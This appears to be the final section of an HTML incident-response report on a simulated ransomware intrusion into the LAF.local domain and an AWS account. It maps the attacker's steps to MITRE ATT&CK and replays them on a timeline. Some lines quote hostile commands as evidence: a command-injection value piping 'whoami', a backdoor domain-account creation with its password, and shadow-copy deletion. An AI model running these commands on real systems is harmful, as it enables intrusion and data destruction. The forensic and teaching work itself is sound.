+<div id="sec-hosts" data-nav="Host Grid"><div class="section"><p class="sec-label">07 · host grid</p><h2>Scope &amp; verdicts</h2><div class="host-grid"><div class="host-card" style="border-top:3px solid #58a6ff">
+  <div class="hc-name">IIS-SERV-PROD</div>
+  <div class="hc-ip">?</div>
+  <div class="hc-role" style="background:#58a6ff20;color:#58a6ff">Entry Point</div>
+  <div class="hc-verdict pwnd">Pwn3d</div>
+</div><div class="host-card" style="border-top:3px solid #ffb800">
+  <div class="hc-name">LAF-SVR01</div>
+  <div class="hc-ip">10.3.10.12</div>
+  <div class="hc-role" style="background:#ffb80020;color:#ffb800">Pivot</div>
+  <div class="hc-verdict pwnd">Pwn3d</div>
+</div><div class="host-card" style="border-top:3px solid #ff3b3b">
+  <div class="hc-name">LAF-DC01</div>
+  <div class="hc-ip">10.3.10.10</div>
+  <div class="hc-role" style="background:#ff3b3b20;color:#ff3b3b">Domain Controller</div>
+  <div class="hc-verdict pwnd">Pwn3d</div>
+</div><div class="host-card" style="border-top:3px solid #ff3b3b">
+  <div class="hc-name">LAF-DC02</div>
+  <div class="hc-ip">10.3.10.11</div>
+  <div class="hc-role" style="background:#ff3b3b20;color:#ff3b3b">Domain Controller</div>
+  <div class="hc-verdict pwnd">Pwn3d</div>
+</div><div class="host-card" style="border-top:3px solid #c084fc">
+  <div class="hc-name">LAF-WS01</div>
+  <div class="hc-ip">10.3.10.13</div>
+  <div class="hc-role" style="background:#c084fc20;color:#c084fc">Victim</div>
+  <div class="hc-verdict pwnd">Pwn3d</div>
+</div><div class="host-card" style="border-top:3px solid #c084fc">
+  <div class="hc-name">LAF-WS02</div>
+  <div class="hc-ip">10.3.10.14</div>
+  <div class="hc-role" style="background:#c084fc20;color:#c084fc">Victim</div>
+  <div class="hc-verdict pwnd">Pwn3d</div>
+</div><div class="host-card" style="border-top:3px solid #00ff9c">
+  <div class="hc-name">AWS-464381121764</div>
+  <div class="hc-ip">cloud</div>
+  <div class="hc-role" style="background:#00ff9c20;color:#00ff9c">Cloud</div>
+  <div class="hc-verdict comp">Compromised</div>
+</div></div></div></div><hr class="divider">
+<div id="sec-ttp" data-nav="TTP Matrix"><div class="section"><p class="sec-label">08 · ttp matrix</p><h2>MITRE ATT&amp;CK</h2><div class="ttp-grid"><div class="ttp-cell"><div class="ttp-tactic">Initial Access</div><div class="ttp-name">Exploit Public-Facing Application</div><div class="ttp-id">T1190</div><div class="ttp-ev">CheckStatus.aspx OS command injection by 172.236.127.251</div></div><div class="ttp-cell"><div class="ttp-tactic">Execution</div><div class="ttp-name">Service Execution</div><div class="ttp-id">T1569.002</div><div class="ttp-ev">rnSylwOz.exe launched via ADMIN$ remote service (Impacket)</div></div><div class="ttp-cell"><div class="ttp-tactic">Execution</div><div class="ttp-name">PowerShell</div><div class="ttp-id">T1059.001</div><div class="ttp-ev">Attacker shells under injected explorer.exe</div></div><div class="ttp-cell"><div class="ttp-tactic">Execution</div><div class="ttp-name">Windows Command Shell</div><div class="ttp-id">T1059.003</div><div class="ttp-ev">cmd.exe PID 15116/15080 spawned from injected explorer</div></div><div class="ttp-cell"><div class="ttp-tactic">Execution</div><div class="ttp-name">Scheduled Task/Job</div><div class="ttp-id">T1053.005</div><div class="ttp-ev">OlgyLYbd task triggered sysAV.bat ransomware chain</div></div><div class="ttp-cell"><div class="ttp-tactic">Persistence</div><div class="ttp-name">Create Domain Account</div><div class="ttp-id">T1136.002</div><div class="ttp-ev">LAF\serviceaccount → Domain Admins at 20:03:05</div></div><div class="ttp-cell"><div class="ttp-tactic">Persistence</div><div class="ttp-name">Image File Execution Options</div><div class="ttp-id">T1547.012</div><div class="ttp-ev">taskmgr.exe Debugger = aws_backup.exe on WS01</div></div><div class="ttp-cell"><div class="ttp-tactic">Persistence</div><div class="ttp-name">PowerShell Profile</div><div class="ttp-id">T1546.013</div><div class="ttp-ev">DC02 PS profile shellcode (created 21:00:21)</div></div><div class="ttp-cell"><div class="ttp-tactic">Privilege Escalation</div><div class="ttp-name">Path Interception: Unquoted Path</div><div class="ttp-id">T1574.009</div><div class="ttp-ev">SolarwindsTFTP unquoted path → SYSTEM</div></div><div class="ttp-cell"><div class="ttp-tactic">Privilege Escalation</div><div class="ttp-name">Account Manipulation</div><div class="ttp-id">T1098</div><div class="ttp-ev">serviceaccount added to Domain Admins</div></div><div class="ttp-cell"><div class="ttp-tactic">Defense Evasion</div><div class="ttp-name">Process Injection</div><div class="ttp-id">T1055</div><div class="ttp-ev">Beacon injected into explorer.exe PID 1332; SHA256 6ef6b52f…</div></div><div class="ttp-cell"><div class="ttp-tactic">Defense Evasion</div><div class="ttp-name">Clear Command History</div><div class="ttp-id">T1070.003</div><div class="ttp-ev">LogDel.bat executed at 21:08:28</div></div><div class="ttp-cell"><div class="ttp-tactic">Defense Evasion</div><div class="ttp-name">Modify Registry</div><div class="ttp-id">T1112</div><div class="ttp-ev">DisableRestrictedAdmin set on WS02 at 21:57:07</div></div><div class="ttp-cell"><div class="ttp-tactic">Credential Access</div><div class="ttp-name">LSASS Memory</div><div class="ttp-id">T1003.001</div><div class="ttp-ev">abedgdaa.dmp (12.2 MB) via comsvcs on SVR01</div></div><div class="ttp-cell"><div class="ttp-tactic">Credential Access</div><div class="ttp-name">NTDS</div><div class="ttp-id">T1003.003</div><div class="ttp-ev">VSS copy → ZIFylmKF.tmp; Impacket secretsdump services</div></div><div class="ttp-cell"><div class="ttp-tactic">Credential Access</div><div class="ttp-name">Private Keys</div><div class="ttp-id">T1552.004</div><div class="ttp-ev">IMDS SSRF → iam_role_iisserver EC2 creds exfil</div></div><div class="ttp-cell"><div class="ttp-tactic">Discovery</div><div class="ttp-name">Network Service Discovery</div><div class="ttp-id">T1046</div><div class="ttp-ev">Advanced IP Scanner 2.5.4594 on DC02 at 20:46:03</div></div><div class="ttp-cell"><div class="ttp-tactic">Lateral Movement</div><div class="ttp-name">Remote Services: SMB/Windows Admin Shares</div><div class="ttp-id">T1021.002</div><div class="ttp-ev">Impacket psexec ADMIN$ to DC01/SVR01</div></div><div class="ttp-cell"><div class="ttp-tactic">Lateral Movement</div><div class="ttp-name">Remote Desktop Protocol</div><div class="ttp-id">T1021.001</div><div class="ttp-ev">SVR01→DC02; RED1→WS01/WS02 as Donny/Dalton</div></div><div class="ttp-cell"><div class="ttp-tactic">Collection</div><div class="ttp-name">Archive Collected Data</div><div class="ttp-id">T1560.001</div><div class="ttp-ev">msupdate.exe (Makecab) → Data.cab</div></div><div class="ttp-cell"><div class="ttp-tactic">Exfiltration</div><div class="ttp-name">Exfiltration Over Alternative Protocol</div><div class="ttp-id">T1048</div><div class="ttp-ev">FileZilla SFTP to 172.236.127.251:22; 164 S3 GetObject</div></div><div class="ttp-cell"><div class="ttp-tactic">Impact</div><div class="ttp-name">Data Encrypted for Impact</div><div class="ttp-id">T1486</div><div class="ttp-ev">IamBatman.exe .bWqQUx ransomware across all 5 hosts</div></div><div class="ttp-cell"><div class="ttp-tactic">Impact</div><div class="ttp-name">Inhibit System Recovery</div><div class="ttp-id">T1490</div><div class="ttp-ev">vssadmin delete shadows /all /quiet before encryption</div></div></div></div></div><hr class="divider">
+
+<div id="sec-dead-ends" data-nav="Dead Ends"><div class="section"><p class="sec-label">10 · dead ends</p><h2>What didn&#x27;t work</h2><div class="reject-grid"><div class="reject"><div class="reject-title">Dead End</div><div class="reject-why">DCSync (Replication-Get-Changes) — NOT attempted; attacker used VSS copy instead (stealthier, no 4662 event).</div></div><div class="reject"><div class="reject-title">Dead End</div><div class="reject-why">Cloud IAM persistence — CreateAccessKey returned LimitExceededException at 21:45:38; attacker did not create persistent cloud backdoor.</div></div></div></div></div><hr class="divider">
+<div id="sec-strengths" data-nav="Strengths"><div class="section"><p class="sec-label">11 · strengths</p><h2>What worked</h2><ul class="strength-list"><li>AWS root account protected by MFA — no root takeover occurred.</li><li>CloudTrail logging was active throughout — full cloud audit trail preserved.</li><li>Sysmon deployed on SVR01 and workstations — attacker command lines recovered.</li><li>Memory capture (KAPE/DumpIt) at 22:46:45 preserved C2 IOCs and injected code for analysis.</li><li></li></ul></div></div><hr class="divider">
+
+<div id="sec-close" data-nav="Close Stamp">
+  <div class="close-stamp">ENGAGEMENT CLOSED · 2026-05-30</div>
+  <div class="close-meta">DFIR Analyst — Protocol SIFT &nbsp;·&nbsp; v1.0 &nbsp;·&nbsp; JackofAllHacks-2026-03</div>
+  <div class="close-meta">Generated 2026-05-30 19:33 UTC</div>
+  <p class="close-caption">Saiyan Spider achieves domain dominance and deploys .bWqQUx ransomware across LAF.local in under 3 hours via web-shell initial access and Impacket lateral movement.</p>
+  <div class="tlp">TLP:AMBER // CONFIDENTIAL // NOT FOR PUBLIC RELEASE</div>
+</div>
+<script>
+mermaid.initialize({
+  startOnLoad:true,
+  theme:'dark',
+  themeVariables:{
+    primaryColor:'#0e1319',
+    primaryTextColor:'#e6edf3',
+    primaryBorderColor:'#21262d',
+    lineColor:'#58a6ff',
+    secondaryColor:'#0b0f14',
+    tertiaryColor:'#05070a'
+  }
+});
+</script>
+<script>
+(function(){
+const EVENTS=[["18:38", "IIS-SERV-PROD", "recon", "Attacker browses target \u00b7 Firefox on Kali"], ["18:40", "IIS-SERV-PROD", "recon", "First OS command injection: url=Google.com | whoami"], ["18:45", "IIS-SERV-PROD", "recon", "Enumerates SolarwindsTFTP unquoted service path"], ["18:51", "IIS-SERV-PROD", "foothold", "certutil downloads so.aspx webshell from C2"], ["18:52", "IIS-SERV-PROD", "foothold", "certutil downloads iis.exe C2 beacon"], ["19:08", "IIS-SERV-PROD", "foothold", "Webshell activated \u2014 curl/8.5.0 POST sessions begin"], ["19:38", "IIS-SERV-PROD", "foothold", "SolarwindsTFTP hijack \u2192 SYSTEM on IIS"], ["19:59", "LAF-SVR01", "foothold", "rnSylwOz.exe launched from ADMIN$ \u2014 C2 173.230.136.180:8443"], ["20:01", "LAF-SVR01", "lateral", "explorer.exe injected \u00b7 beacon established"], ["20:02", "LAF-SVR01", "cred", "net user serviceaccount P@ssw0RD1! /add /domain"], ["20:03", "LAF-DC01", "pwn", "serviceaccount \u2192 Domain Admins \u00b7 DOMAIN OWNED"], ["20:03", "LAF-SVR01", "cred", "LSASS dump \u2192 abedgdaa.dmp"], ["20:08", "LAF-DC01", "cred", "Impacket smbexec \u00b7 5 random-name services installed"], ["20:09", "LAF-DC01", "cred", "VSS copy ntds.dit \u2192 ZIFylmKF.tmp"], ["20:14", "LAF-SVR01", "lateral", "RED1 RDP session opened on SVR01"], ["20:16", "LAF-WS01", "lateral", "LAFAdmin Type-3 logon from SVR01"], ["20:20", "LAF-SVR01", "cred", "msupdate.exe (Makecab) \u2192 Data.cab file collection"], ["20:35", "LAF-WS01", "lateral", "RED1 RDP as Donny (Type 10) \u00b7 interactive session"], ["20:37", "LAF-WS01", "lateral", "aws_backup.exe dropped \u00b7 IFEO persistence set"], ["20:46", "LAF-DC02", "lateral", "Advanced IP Scanner downloaded \u00b7 network scan"], ["21:00", "LAF-DC02", "lateral", "PowerShell profile shellcode persistence installed"], ["21:08", "LAF-SVR01", "lateral", "LogDel.bat \u2014 event log clearing"], ["21:42", "AWS", "pwn", "GetCallerIdentity \u2014 AWS whoami with stolen EC2 creds"], ["21:49", "AWS", "pwn", "164 \u00d7 S3 GetObject \u2014 data exfiltration to 212.8.249.213"], ["21:57", "LAF-WS02", "lateral", "DisableRestrictedAdmin set (PtH-over-RDP)"], ["22:06", "LAF-DC02", "lateral", "SVR01 \u2192 DC02 outbound RDP"], ["22:08", "LAF-WS02", "pwn", "FIRST ENCRYPTION \u2014 .bWqQUx \u00b7 WS02 \u00b7 ransomware begins"], ["22:09", "LAF-WS01", "pwn", "vssadmin delete shadows \u00b7 IamBatman.exe encrypt C:\\"], ["22:10", "LAF-DC01", "pwn", "DC01 encrypted \u00b7 domain controllers down"], ["22:30", "LAF-SVR01", "lateral", "RED1 reconnects via RDP to SVR01"], ["22:46", "LAF-SVR01", "pwn", "Memory captured \u2014 investigation begins"]];
+const HOSTS=["IIS-SERV-PROD", "LAF-SVR01", "LAF-DC01", "LAF-DC02", "LAF-WS01", "LAF-WS02", "AWS"];
+const COLORS={"recon": "#58a6ff", "foothold": "#ffb800", "cred": "#c084fc", "lateral": "#c084fc", "pwn": "#ff3b3b"};
+let idx=0,playing=false,timer=null,speed=1;
+const SPEEDS=[1,4,16,60];
+let sIdx=0;
+
+function hostEl(h){return document.getElementById('hc-'+h.replace(/[^a-z0-9]/gi,'_'))}
+function evEl(i){return document.getElementById('ev-'+i)}
+
+function render(n){
+  idx=Math.max(0,Math.min(n,EVENTS.length-1));
+  EVENTS.forEach((_,i)=>{
+    const el=evEl(i);if(!el)return;
+    el.classList.toggle('fired',i<idx);
+    el.classList.toggle('current',i===idx);
+  });
+  // update host chips
+  const pwnd=new Set(),act=new Set();
+  for(let i=0;i<=idx;i++){
+    const ph=EVENTS[i][2];
+    const h=EVENTS[i][1];
+    if(ph==='pwn') pwnd.add(h); else act.add(h);
+  }
+  HOSTS.forEach(h=>{
+    const el=hostEl(h);if(!el)return;
+    el.classList.toggle('pwned',pwnd.has(h));
+    el.classList.toggle('active',act.has(h)&&!pwnd.has(h));
+  });
+  // scrub
+  const pct=EVENTS.length>1?(idx/(EVENTS.length-1)*100):0;
+  const fill=document.getElementById('scrub-fill');
+  if(fill)fill.style.width=pct+'%';
+  // counter
+  const ctr=document.getElementById('ev-ctr');
+  if(ctr)ctr.textContent=(idx+1)+'/'+EVENTS.length;
+  // scroll event into view
+  const cur=evEl(idx);if(cur)cur.scrollIntoView({block:'nearest'});
+}
+
+function step(d){stop();render(idx+d)}
+function stop(){if(timer){clearInterval(timer);timer=null}playing=false;
+  const pb=document.getElementById('btn-play');if(pb)pb.textContent='▶'}
+function play(){
+  if(idx>=EVENTS.length-1)render(0);
+  playing=true;
+  const pb=document.getElementById('btn-play');if(pb)pb.textContent='⏸';
+  timer=setInterval(()=>{
+    if(idx>=EVENTS.length-1){stop();return}
+    render(idx+1);
+  },600/speed);
+}
+function togglePlay(){playing?stop():play()}
+
+window.replayReset=()=>{stop();render(0)};
+window.replayBack=()=>step(-1);
+window.replayPlay=()=>togglePlay();
+window.replayFwd=()=>step(1);
+window.replayCycle=()=>{
+  sIdx=(sIdx+1)%SPEEDS.length;speed=SPEEDS[sIdx];
+  const el=document.getElementById('speed-lbl');if(el)el.textContent=speed+'×';
+  if(playing){stop();play();}
+};
+
+document.addEventListener('DOMContentLoaded',()=>{
+  render(0);
+  const scrub=document.getElementById('scrub-bar');
+  if(scrub){scrub.addEventListener('click',e=>{
+    const r=scrub.getBoundingClientRect();
+    const pct=(e.clientX-r.left)/r.width;
+    render(Math.round(pct*(EVENTS.length-1)));
+  });}
+  // click event rows
+  EVENTS.forEach((_,i)=>{
+    const el=evEl(i);if(!el)return;
+    el.addEventListener('click',()=>{stop();render(i);});
+  });
+  // nav
+  const tog=document.getElementById('nav-toggle');
+  const drw=document.getElementById('nav-drawer');
+  const cls=document.getElementById('nav-close');
+  if(tog)tog.onclick=()=>drw.classList.toggle('open');
+  if(cls)cls.onclick=()=>drw.classList.remove('open');
+  // build nav links dynamically
+  const nav=document.getElementById('nav-links');
+  if(nav){
+    document.querySelectorAll('[data-nav]').forEach((el,n)=>{
+      const a=document.createElement('a');
+      a.className='nav-item';a.href='#'+el.id;
+      a.innerHTML='<span class="nav-num">'+String(n+1).padStart(2,'0')+'</span>'+el.dataset.nav;
+      a.onclick=()=>drw.classList.remove('open');
+      nav.appendChild(a);
+    });
+  }
+});
+})();
+</script>
+</body>
+</html>
